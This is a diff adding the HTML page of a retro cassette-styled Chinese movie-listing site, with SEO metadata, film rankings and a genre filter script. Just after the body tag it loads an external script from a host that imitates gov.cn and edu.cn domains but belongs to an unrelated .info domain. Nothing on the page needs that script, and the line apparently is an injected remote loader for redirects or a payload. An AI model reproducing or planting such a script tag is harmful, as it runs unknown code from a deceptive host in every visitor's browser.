@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>96电影网 - 复古磁带母带影视站 | https://96dianyingwang-top.github.io</title>
+<meta name="description" content="96电影网(https://96dianyingwang-top.github.io)采用复古磁带与96kHz母带音频终端风格，提供新片入库、母带品质榜、年代类型与录音札记，移动端自适应，适合必应收录与影视检索。">
+<meta name="keywords" content="96电影网,96dianyingwang-top,复古磁带,母带电影,影视推荐,年代类型,在线观看">
+<meta name="author" content="96电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://96dianyingwang-top.github.io">
+<meta property="og:title" content="96电影网 - 复古磁带母带影视站">
+<meta property="og:description" content="96电影网提供新片入库、母带品质榜、年代类型与录音札记，复古磁带风格。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://96dianyingwang-top.github.io">
+<style>
+:root{
+  --paper:#efe6d6;--paper2:#e7dcc6;--tape:#d8c9a7;--ink:#2b2318;--ink2:#5c4f38;
+  --orange:#e8641f;--orange-d:#b84712;--green:#3f8f5b;--red:#c93b2d;
+  --line:#cbb996;--mono:"Courier New",ui-monospace,Menlo,Consolas,monospace;
+  --sans:-apple-system,"Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  --radius:10px;--shadow:0 8px 22px rgba(43,35,24,.16);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--sans);background:var(--paper);color:var(--ink);line-height:1.65;overflow-x:hidden;
+  background-image:repeating-linear-gradient(0deg,transparent 0 31px,rgba(43,35,24,.025) 31px 32px);}
+a{text-decoration:none;color:inherit;}
+
+/* 导航 */
+.navbar{position:sticky;top:0;z-index:1000;background:var(--ink);border-bottom:3px solid var(--orange);}
+.nav-box{max-width:1200px;margin:0 auto;padding:0 16px;height:58px;display:flex;align-items:center;justify-content:space-between;}
+.brand{font-family:var(--mono);font-weight:900;color:var(--paper);display:flex;align-items:center;gap:8px;font-size:1.05rem;}
+.brand i{font-style:normal;color:var(--orange);font-size:1.4rem;letter-spacing:-2px;}
+.brand .badge{font-size:.66rem;color:var(--ink);background:var(--orange);padding:2px 6px;border-radius:4px;margin-left:6px;}
+.nav-links{list-style:none;display:flex;gap:2px;}
+.nav-links a{padding:9px 13px;border-radius:6px;font-size:.85rem;font-weight:700;color:var(--paper2);transition:.2s;}
+.nav-links a:hover,.nav-links a.active{color:var(--ink);background:var(--orange);}
+.m-btn{display:none;background:var(--orange);color:#fff;border:none;border-radius:6px;padding:8px 12px;font-size:1.05rem;cursor:pointer;}
+.container{max-width:1200px;margin:0 auto;padding:24px 16px 40px;}
+
+/* 电平指示 */
+.vu{display:flex;gap:14px;align-items:center;border:2px solid var(--ink);background:var(--ink);border-radius:8px;padding:8px 14px;margin-bottom:18px;}
+.vu .label{font-family:var(--mono);font-size:.72rem;color:var(--paper2);letter-spacing:1px;}
+.vu-track{flex:1;height:12px;background:repeating-linear-gradient(90deg,#3a3225 0 6px,#2b2318 6px 12px);border-radius:6px;overflow:hidden;position:relative;}
+.vu-needle{position:absolute;top:0;left:0;height:100%;width:78%;background:linear-gradient(90deg,var(--green) 0 60%,var(--orange) 60% 88%,var(--red) 88%);}
+.vu .val{font-family:var(--mono);font-size:.82rem;font-weight:900;color:var(--orange);min-width:74px;text-align:right;}
+
+/* Hero 终端 */
+.hero{display:grid;grid-template-columns:1.25fr .85fr;gap:18px;margin-bottom:26px;}
+.deck{background:var(--paper2);border:2px solid var(--ink);border-radius:var(--radius);padding:26px;position:relative;box-shadow:var(--shadow);}
+.deck:before{content:"";position:absolute;inset:10px;pointer-events:none;border:1px dashed var(--line);}
+.deck .tag{display:inline-block;font-family:var(--mono);font-size:.68rem;letter-spacing:2px;color:#fff;background:var(--red);padding:4px 9px;border-radius:4px;font-weight:900;margin-bottom:12px;}
+.deck h1{font-size:clamp(1.8rem,4vw,2.9rem);font-weight:900;line-height:1.12;margin-bottom:10px;font-family:var(--mono);}
+.deck h1 em{color:var(--orange);font-style:normal;} .deck h1 b{font-size:.6em;vertical-align:super;color:var(--ink2);}
+.deck p{color:var(--ink2);font-size:.92rem;max-width:620px;margin-bottom:14px;}
+.domain{display:inline-block;font-family:var(--mono);font-size:.76rem;color:var(--orange-d);border:1px dashed var(--orange);padding:8px 12px;border-radius:6px;margin-bottom:16px;background:rgba(232,100,31,.06);}
+.cta{display:inline-block;background:var(--orange);color:#fff;font-weight:900;font-size:.85rem;padding:12px 24px;border-radius:6px;border:2px solid var(--ink);transition:.2s;}
+.cta:hover{background:var(--ink);color:var(--paper);}
+.kpis{display:grid;grid-template-rows:repeat(3,1fr);gap:12px;}
+.kpi{background:var(--paper2);border:2px solid var(--ink);border-radius:10px;padding:12px 14px;display:flex;align-items:center;gap:12px;position:relative;}
+.kpi .no{font-family:var(--mono);font-weight:900;color:var(--orange-d);min-width:52px;font-size:.92rem;}
+.kpi .t{font-weight:800;font-size:.88rem;} .kpi .s{font-size:.7rem;color:var(--ink2);font-family:var(--mono);}
+.kpi:after{content:"";position:absolute;right:12px;top:50%;transform:translateY(-50%);width:8px;height:8px;background:var(--green);border-radius:50%;box-shadow:0 0 0 3px rgba(63,143,91,.25);}
+.kpi.r:after{background:var(--orange);box-shadow:0 0 0 3px rgba(232,100,31,.25);}
+.kpi.o:after{background:var(--red);box-shadow:0 0 0 3px rgba(201,59,45,.25);}
+
+/* 区块 */
+.sec{margin:28px 0;}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.sec-title{font-size:1.22rem;font-weight:900;font-family:var(--mono);display:flex;align-items:center;gap:9px;}
+.sec-title:before{content:"";width:14px;height:14px;background:var(--orange);border:2px solid var(--ink);transform:rotate(45deg);display:inline-block;}
+.more{font-family:var(--mono);font-size:.78rem;font-weight:700;color:var(--orange-d);padding:6px 12px;border:2px solid var(--orange);border-radius:6px;background:rgba(232,100,31,.07);}
+.more:hover{background:var(--orange);color:#fff;}
+
+/* 磁带列表 */
+.tape-list{background:var(--paper2);border:2px solid var(--ink);border-radius:var(--radius);overflow:hidden;}
+.t-row{display:grid;grid-template-columns:92px 1fr auto;gap:14px;align-items:center;padding:14px 18px;border-bottom:1px solid var(--line);}
+.t-row:last-child{border-bottom:none;}
+.t-side{font-family:var(--mono);font-size:.78rem;font-weight:900;color:var(--paper);background:var(--ink);padding:6px 0;text-align:center;border-radius:4px;}
+.t-side b{display:block;font-size:1rem;}
+.t-main .nm{font-weight:800;font-size:.92rem;} .t-main .ds{font-size:.74rem;color:var(--ink2);}
+.wave{height:8px;margin-top:6px;background:repeating-linear-gradient(90deg,var(--ink2) 0 2px,transparent 2px 5px);border-radius:4px;position:relative;overflow:hidden;}
+.wave i{position:absolute;left:0;top:0;height:100%;background:var(--orange);opacity:.85;}
+.t-rate{font-family:var(--mono);font-weight:900;color:var(--orange-d);white-space:nowrap;font-size:.85rem;}
+
+/* 磁带卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(196px,1fr));gap:18px;}
+.tape{background:var(--tape);border:2px solid var(--ink);border-radius:12px;padding:12px;transition:.2s;box-shadow:var(--shadow);position:relative;}
+.tape:before{content:"";position:absolute;left:50%;top:0;transform:translateX(-50%);width:78px;height:10px;background:var(--paper2);border:2px solid var(--ink);border-top:none;border-radius:0 0 8px 8px;}
+.tape:after{content:"";position:absolute;left:50%;bottom:14px;transform:translateX(-50%);width:62px;height:4px;background:repeating-linear-gradient(90deg,var(--ink) 0 4px,transparent 4px 8px);opacity:.4;}
+.tape:hover{transform:translateY(-5px) rotate(-1deg);background:var(--paper2);}
+.reel-wrap{display:flex;justify-content:center;gap:28px;padding:20px 0 14px;}
+.reel{width:52px;height:52px;border-radius:50%;background:var(--ink);position:relative;display:flex;align-items:center;justify-content:center;}
+.reel:before{content:"";width:20px;height:20px;background:var(--tape);border-radius:50%;}
+.reel:after{content:"";position:absolute;inset:0;background:repeating-conic-gradient(var(--paper2) 0 18deg,var(--ink) 18deg 36deg);border-radius:50%;-webkit-mask:radial-gradient(circle,transparent 8px,black 9px);mask:radial-gradient(circle,transparent 8px,black 9px);}
+.t-label{background:var(--paper);border:1px solid var(--line);border-radius:6px;padding:10px 11px;text-align:center;}
+.t-label .t-no{font-family:var(--mono);font-size:.68rem;color:var(--ink2);margin-bottom:3px;}
+.t-label .name{font-weight:800;font-size:.88rem;margin-bottom:3px;}
+.t-label .meta{font-size:.7rem;color:var(--ink2);font-family:var(--mono);}
+.t-label .khz{margin-top:6px;display:inline-block;font-family:var(--mono);font-size:.68rem;font-weight:900;color:var(--paper);background:var(--green);padding:2px 7px;border-radius:3px;}
+
+/* 母带榜 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.rcol{background:var(--paper2);border:2px solid var(--ink);border-radius:var(--radius);padding:16px 18px;}
+.rcol h3{font-family:var(--mono);font-size:1rem;margin-bottom:12px;padding-bottom:8px;border-bottom:2px dashed var(--line);}
+.ritem{display:grid;grid-template-columns:34px 1fr auto;gap:10px;align-items:center;padding:9px 0;border-bottom:1px solid rgba(43,35,24,.08);}
+.ritem:last-child{border-bottom:none;}
+.rnum{font-family:var(--mono);font-weight:900;width:28px;height:28px;display:flex;align-items:center;justify-content:center;background:var(--ink);color:var(--paper);border-radius:5px;font-size:.85rem;}
+.rnum.top{background:var(--orange);}
+.rname{font-weight:700;font-size:.88rem;} .rtag{font-size:.7rem;color:var(--ink2);font-family:var(--mono);}
+.rkhz{font-family:var(--mono);font-weight:900;color:var(--green);background:rgba(63,143,91,.12);padding:2px 6px;border-radius:4px;font-size:.74rem;}
+
+/* 年代 */
+.chips{display:flex;flex-wrap:wrap;gap:10px;}
+.chip{font-family:var(--mono);padding:9px 15px;border:2px solid var(--ink);background:var(--paper2);border-radius:6px;font-size:.8rem;font-weight:700;color:var(--ink2);cursor:pointer;transition:.2s;}
+.chip:hover,.chip.on{background:var(--ink);color:var(--paper);}
+
+/* 录音札记 */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;}
+.note{background:var(--paper2);border:2px solid var(--ink);border-radius:var(--radius);padding:16px;transition:.2s;}
+.note:hover{transform:translateY(-3px);background:var(--paper);}
+.note h3{font-size:.95rem;margin-bottom:8px;}
+.note p{font-size:.8rem;color:var(--ink2);margin-bottom:10px;}
+.note .au{font-size:.72rem;color:var(--orange-d);font-weight:700;font-family:var(--mono);}
+
+footer{border-top:3px solid var(--ink);background:var(--ink);margin-top:40px;padding:34px 16px;text-align:center;}
+.foot-brand{font-family:var(--mono);font-weight:900;font-size:1.2rem;color:var(--paper);margin-bottom:10px;}
+.foot-brand i{color:var(--orange);font-style:normal;}
+.foot-links{display:flex;justify-content:center;gap:18px;margin-bottom:14px;flex-wrap:wrap;}
+.foot-links a{color:var(--paper2);font-size:.82rem;} .foot-links a:hover{color:var(--orange);}
+footer p{font-size:.76rem;color:var(--paper2);margin:4px 0;}
+footer .kw{margin-top:10px;color:var(--orange);font-weight:700;font-family:var(--mono);}
+
+@media(max-width:980px){.hero{grid-template-columns:1fr;}.rank{grid-template-columns:1fr;}.notes{grid-template-columns:1fr 1fr;}}
+@media(max-width:760px){.m-btn{display:block;}.nav-links{display:none;position:absolute;left:0;right:0;top:58px;background:var(--ink);flex-direction:column;padding:10px 16px;border-bottom:3px solid var(--orange);}.nav-links.open{display:flex;}.nav-links a{padding:11px 12px;text-align:center;}.grid{grid-template-columns:1fr 1fr;}.kpis{grid-template-columns:1fr;}}
+@media(max-width:460px){.deck{padding:20px;}.grid{grid-template-columns:1fr;}.notes{grid-template-columns:1fr;}.t-row{grid-template-columns:64px 1fr;}.t-rate{grid-column:2;}}
+</style>
+</head>
+<body>
+
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="navbar">
+  <div class="nav-box">
+    <a href="#" class="brand"><i>96</i>电影网<span class="badge">MASTER TAPE</span></a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home" class="active">播放台</a></li>
+        <li><a href="#tape">磁带片库</a></li>
+        <li><a href="#master">母带品质榜</a></li>
+        <li><a href="#era">年代类型</a></li>
+        <li><a href="#note">录音札记</a></li>
+      </ul>
+    </nav>
+    <button class="m-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="container">
+  <div class="vu">
+    <span class="label">VU METER</span>
+    <div class="vu-track"><div class="vu-needle"></div></div>
+    <span class="val">-6 dB · 96kHz</span>
+  </div>
+
+  <section class="hero" id="home">
+    <div class="deck">
+      <span class="tag">TYPE-IV · 96kHz / 24bit</span>
+      <h1>96电影网<em>·</em>母带影视终端<b>BETA</b></h1>
+      <p>把看片当听母带：按磁带片库、母带品质、年代类型与录音札记归档。96电影网用复古卡带面板帮你找回“一张碟、一盘带”的观影仪式感。</p>
+      <div class="domain">https://96dianyingwang-top.github.io</div><br>
+      <a href="#tape" class="cta">▶ 播放磁带片库</a>
+    </div>
+    <div class="kpis">
+      <div class="kpi"><div class="no">C-1280</div><div><div class="t">在库磁带</div><div class="s">剧情/音乐/年代持续入库</div></div></div>
+      <div class="kpi r"><div class="no">-18 LUFS</div><div><div class="t">平均响度</div><div class="s">母带样本估算</div></div></div>
+      <div class="kpi o"><div class="no">A- 8.7</div><div><div class="t">母带均分</div><div class="s">品质榜独立计算</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="tape">
+    <div class="sec-head"><h2 class="sec-title">磁带片库 · A/B面</h2><a href="#" class="more">全部磁带 ›</a></div>
+    <div class="tape-list" id="tapeList">
+      <div class="t-row" data-g="音乐"><div class="t-side">A<b>01</b></div><div class="t-main"><div class="nm">爱乐之城</div><div class="ds">音乐/歌舞 · 爵士钢琴与交响人声</div><div class="wave"><i style="width:92%"></i></div></div><div class="t-rate">8.7</div></div>
+      <div class="t-row" data-g="传记"><div class="t-side">A<b>02</b></div><div class="t-main"><div class="nm">波西米亚狂想曲</div><div class="ds">音乐/传记 · 现场重建与混音</div><div class="wave"><i style="width:88%"></i></div></div><div class="t-rate">8.4</div></div>
+      <div class="t-row" data-g="剧情"><div class="t-side">A<b>03</b></div><div class="t-main"><div class="nm">海上钢琴师</div><div class="ds">剧情/音乐 · 钢琴动态与人声</div><div class="wave"><i style="width:90%"></i></div></div><div class="t-rate">9.0</div></div>
+      <div class="t-row" data-g="科幻"><div class="t-side">B<b>01</b></div><div class="t-main"><div class="nm">星际穿越</div><div class="ds">科幻/剧情 · 管风琴低频</div><div class="wave"><i style="width:93%"></i></div></div><div class="t-rate">9.3</div></div>
+      <div class="t-row" data-g="动画"><div class="t-side">B<b>02</b></div><div class="t-main"><div class="nm">你的名字。</div><div class="ds">动画/爱情 · 环境音与主题曲</div><div class="wave"><i style="width:86%"></i></div></div><div class="t-rate">8.6</div></div>
+      <div class="t-row" data-g="悬疑"><div class="t-side">B<b>03</b></div><div class="t-main"><div class="nm">坠落的审判</div><div class="ds">悬疑/剧情 · 法庭录音与静默</div><div class="wave"><i style="width:87%"></i></div></div><div class="t-rate">8.7</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="tapes">
+    <div class="sec-head"><h2 class="sec-title">磁带卡片 · 母带封面</h2><a href="#" class="more">更多磁带 ›</a></div>
+    <div class="grid" id="movieGrid">
+      <a href="#" class="tape" data-g="音乐"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-001 · SIDE A</div><div class="name">爱乐之城</div><div class="meta">2016 · 音乐/歌舞</div><span class="khz">96kHz</span></div></a>
+      <a href="#" class="tape" data-g="科幻"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-002 · SIDE A</div><div class="name">星际穿越</div><div class="meta">2014 · 科幻/剧情</div><span class="khz">96kHz</span></div></a>
+      <a href="#" class="tape" data-g="动画"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-003 · SIDE B</div><div class="name">你的名字。</div><div class="meta">2016 · 动画/爱情</div><span class="khz">96kHz</span></div></a>
+      <a href="#" class="tape" data-g="剧情"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-004 · SIDE A</div><div class="name">海上钢琴师</div><div class="meta">1998 · 剧情/音乐</div><span class="khz">96kHz</span></div></a>
+      <a href="#" class="tape" data-g="悬疑"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-005 · SIDE B</div><div class="name">坠落的审判</div><div class="meta">2023 · 悬疑/剧情</div><span class="khz">96kHz</span></div></a>
+      <a href="#" class="tape" data-g="传记"><div class="reel-wrap"><div class="reel"></div><div class="reel"></div></div><div class="t-label"><div class="t-no">C-006 · SIDE A</div><div class="name">波西米亚狂想曲</div><div class="meta">2018 · 音乐/传记</div><span class="khz">96kHz</span></div></a>
+    </div>
+  </section>
+
+  <section class="sec" id="master">
+    <div class="sec-head"><h2 class="sec-title">母带品质榜</h2><a href="#" class="more">完整排行 ›</a></div>
+    <div class="rank">
+      <div class="rcol">
+        <h3>🔊 本周母带分</h3>
+        <a href="#" class="ritem"><div class="rnum top">1</div><div><div class="rname">星际穿越</div><div class="rtag">科幻/剧情 · 管风琴低频深</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum top">2</div><div><div class="rname">奥本海默</div><div class="rtag">剧情/传记 · 核爆动态大</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum top">3</div><div><div class="rname">沙丘2</div><div class="rtag">科幻/战争 · 风声纹理</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum">4</div><div><div class="rname">海上钢琴师</div><div class="rtag">剧情/音乐 · 钢琴动态</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum">5</div><div><div class="rname">爱乐之城</div><div class="rtag">音乐/歌舞 · 人声分离</div></div><div class="rkhz">24bit</div></a>
+      </div>
+      <div class="rcol">
+        <h3>🎚️ 经典母带</h3>
+        <a href="#" class="ritem"><div class="rnum top">1</div><div><div class="rname">盗梦空间</div><div class="rtag">科幻/动作 · 多层混音</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum top">2</div><div><div class="rname">1917</div><div class="rtag">战争/剧情 · 一镜空间感</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum top">3</div><div><div class="rname">降临</div><div class="rtag">科幻/剧情 · 低频氛围</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum">4</div><div><div class="rname">once音乐之梦</div><div class="rtag">音乐/爱情 · 原声干净</div></div><div class="rkhz">24bit</div></a>
+        <a href="#" class="ritem"><div class="rnum">5</div><div><div class="rname">Begin Again</div><div class="rtag">音乐/喜剧 · 街头人声</div></div><div class="rkhz">24bit</div></a>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="era">
+    <div class="sec-head"><h2 class="sec-title">年代类型</h2><a href="#" class="more">重置 ›</a></div>
+    <div class="chips" id="chips">
+      <button class="chip on" data-g="all">全部 ALL</button>
+      <button class="chip" data-g="音乐">音乐/歌舞</button>
+      <button class="chip" data-g="科幻">科幻</button>
+      <button class="chip" data-g="动画">动画</button>
+      <button class="chip" data-g="剧情">剧情</button>
+      <button class="chip" data-g="悬疑">悬疑</button>
+      <button class="chip" data-g="传记">传记</button>
+      <button class="chip" data-g="战争">战争</button>
+      <button class="chip" data-g="爱情">爱情</button>
+    </div>
+  </section>
+
+  <section class="sec" id="note">
+    <div class="sec-head"><h2 class="sec-title">录音札记</h2><a href="#" class="more">更多札记 ›</a></div>
+    <div class="notes">
+      <a href="#" class="note"><h3>奥本海默：核爆低频与对白层次</h3><p>从无声段、次低频到三人对白混音，看如何用声压变化替代配乐堆砌，大银幕音响优先。</p><div class="au">TAPE·NOTE/001</div></a>
+      <a href="#" class="note"><h3>海上钢琴师：钢琴动态如何留住</h3><p>拆解独奏段落的录音电平与混响处理，说明为什么这类片值得找高码率版本重听。</p><div class="au">TAPE·NOTE/002</div></a>
+      <a href="#" class="note"><h3>波西米亚狂想曲：现场重建的取舍</h3><p>从Live Aid段落的采样、母带修复到声像定位，谈重制版相比原版的真实与加工。</p><div class="au">TAPE·NOTE/003</div></a>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="foot-brand">96<i>电影网</i> · MASTER TAPE</div>
+  <div class="foot-links">
+    <a href="#">关于我们</a><a href="#">免责声明</a><a href="#">片源合作</a><a href="#">联系我们</a>
+  </div>
+  <p>https://96dianyingwang-top.github.io</p>
+  <p>96电影网 - 复古磁带与96kHz母带影视终端，提供磁带片库、母带品质榜、年代类型与录音札记。</p>
+  <p class="kw">关键词：96电影网、96dianyingwang-top、复古磁带、母带电影、影视推荐、年代类型、在线观看</p>
+  <p>© 2024 96电影网（演示站）保留所有权利</p>
+</footer>
+
+<script>
+(function(){
+  var mBtn=document.getElementById('mBtn'),nav=document.getElementById('navLinks');
+  mBtn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){var a=e.target.closest('a');if(!a)return;
+    nav.querySelectorAll('a').forEach(function(x){x.classList.remove('active');});a.classList.add('active');
+    if(window.innerWidth<=760){nav.classList.remove('open');}});
+
+  var chips=document.getElementById('chips'),grid=document.getElementById('movieGrid'),tl=document.getElementById('tapeList');
+  function filter(g){
+    if(grid)grid.querySelectorAll('.tape').forEach(function(c){c.style.display=(g==='all'||c.getAttribute('data-g')===g)?'':'none';});
+    if(tl)tl.querySelectorAll('.t-row').forEach(function(r){r.style.display=(g==='all'||r.getAttribute('data-g')===g)?'':'none';});
+  }
+  if(chips){chips.addEventListener('click',function(e){var b=e.target.closest('.chip');if(!b)return;
+    chips.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on');});b.classList.add('on');filter(b.getAttribute('data-g'));});}
+
+  document.querySelectorAll('.tape,.cta,.more,.note').forEach(function(el){
+    el.addEventListener('click',function(e){if(el.classList.contains('chip'))return;e.preventDefault();
+      el.style.transform='scale(.97)';setTimeout(function(){el.style.transform='';},150);});
+  });
+})();
+</script>
+</body>
+</html>
